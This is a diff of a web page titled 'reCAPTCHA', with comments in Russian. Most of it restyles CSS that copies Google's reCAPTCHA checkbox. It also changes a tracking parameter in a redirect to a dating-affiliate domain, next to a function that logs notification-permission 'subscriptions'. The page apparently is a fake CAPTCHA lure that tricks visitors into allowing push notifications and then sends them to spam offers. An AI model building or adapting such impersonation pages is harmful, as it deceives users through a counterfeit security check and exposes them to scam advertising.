@@ -7,144 +7,145 @@
     <title>reCAPTCHA</title>
     <style>
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f9f9f9;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 10px;
-        }
-        .captcha-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 300px;
-            padding: 10px;
-            border: 1px solid #dfe1e5;
-            border-radius: 4px;
-            background-color: #fff;
-        }
-        .captcha-left {
-            display: flex;
-            align-items: center;
-        }
-        .captcha-checkbox {
-            margin-right: 10px;
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-            border: 2px solid #5f6368;
-            background-color: #fff;
-            position: relative;
-            appearance: none;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-        }
-        .captcha-checkbox.completed {
-            background-color: #1a73e8;
-            border-color: #1a73e8;
-            animation: fillCheckbox 0.3s ease;
-        }
-        .captcha-checkbox.completed::after {
-            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: block;
-        }
-        .captcha-checkbox.loading {
-            background-color: #fff;
-            border-color: #5f6368;
-            cursor: wait;
-        }
-        .captcha-checkbox.loading::after {
-            content: '';
-            width: 12px;
-            height: 12px;
-            border: 2px solid #1a73e8;
-            border-top-color: transparent;
-            border-radius: 50%;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes fillCheckbox {
-            0% {
-                background-color: #fff;
-                border-color: #5f6368;
-            }
-            100% {
-                background-color: #1a73e8;
-                border-color: #1a73e8;
-            }
-        }
-        @keyframes spin {
-            0% {
-                transform: translate(-50%, -50%) rotate(0deg);
-            }
-            100% {
-                transform: translate(-50%, -50%) rotate(360deg);
-            }
-        }
-        .captcha-text {
-            font-size: 14px;
-            color: #202124;
-        }
-        .captcha-right {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        .captcha-logo {
-            width: 20px;
-            height: 20px;
-            margin-bottom: 5px;
-        }
-        .captcha-brand {
-            font-size: 12px;
-            color: #1a73e8;
-        }
-        .captcha-links {
-            font-size: 10px;
-            color: #5f6368;
-        }
-        .captcha-links a {
-            color: #5f6368;
-            text-decoration: none;
-        }
-        .submit-button {
-            padding: 8px 16px;
-            background-color: #f1f3f4;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 14px;
-            color: #202124;
-            cursor: pointer;
-        }
-        .submit-button:hover {
-            background-color: #e8eaed;
-        }
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .error {
-            color: red;
-            font-size: 12px;
-            display: none;
-            margin-top: 5px;
-        }
+    font-family: 'Roboto', Arial, sans-serif;
+    margin: 0;
+    background-color: #f9f9f9;
+    overflow: hidden; /* Отключаем прокрутку */
+}
+.container {
+    position: fixed; /* Фиксируем позицию */
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%); /* Центрируем по обоим осям */
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+}
+.captcha-container {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    width: 300px;
+    padding: 10px;
+    border: 1px solid #dfe1e5;
+    border-radius: 4px;
+    background-color: #fff;
+}
+.captcha-left {
+    display: flex;
+    align-items: center;
+}
+.captcha-checkbox {
+    margin-right: 10px;
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+    border: 2px solid #5f6368;
+    background-color: #fff;
+    position: relative;
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+}
+.captcha-checkbox.completed {
+    background-color: #1a73e8;
+    border-color: #1a73e8;
+    animation: fillCheckbox 0.3s ease;
+}
+.captcha-checkbox.completed::after {
+    content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: block;
+}
+.captcha-checkbox.loading {
+    background-color: #fff;
+    border-color: #5f6368;
+    cursor: wait;
+}
+.captcha-checkbox.loading::after {
+    content: '';
+    width: 12px;
+    height: 12px;
+    border: 2px solid #1a73e8;
+    border-top-color: transparent;
+    border-radius: 50%;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    animation: spin 0.8s linear infinite;
+}
+@keyframes fillCheckbox {
+    0% {
+        background-color: #fff;
+        border-color: #5f6368;
+    }
+    100% {
+        background-color: #1a73e8;
+        border-color: #1a73e8;
+    }
+}
+@keyframes spin {
+    0% {
+        transform: translate(-50%, -50%) rotate(0deg);
+    }
+    100% {
+        transform: translate(-50%, -50%) rotate(360deg);
+    }
+}
+.captcha-text {
+    font-size: 14px;
+    color: #202124;
+}
+.captcha-right {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+}
+.captcha-logo {
+    width: 20px;
+    height: 20px;
+    margin-bottom: 5px;
+}
+.captcha-brand {
+    font-size: 12px;
+    color: #1a73e8;
+}
+.captcha-links {
+    font-size: 10px;
+    color: #5f6368;
+}
+.captcha-links a {
+    color: #5f6368;
+    text-decoration: none;
+}
+.submit-button {
+    padding: 8px 16px;
+    background-color: #f1f3f4;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 14px;
+    color: #202124;
+    cursor: pointer;
+}
+.submit-button:hover {
+    background-color: #e8eaed;
+}
+.button-container {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+}
+.error {
+    color: red;
+    font-size: 12px;
+    display: none;
+    margin-top: 5px;
+}
     </style>
 </head>
 <body>
@@ -187,7 +188,7 @@
         */
 
         // Ссылка для редиректа
-        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd24';
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
 
         // Функция для логирования подписки
         function logSubscription(permission, subId = 'test_campaign') {
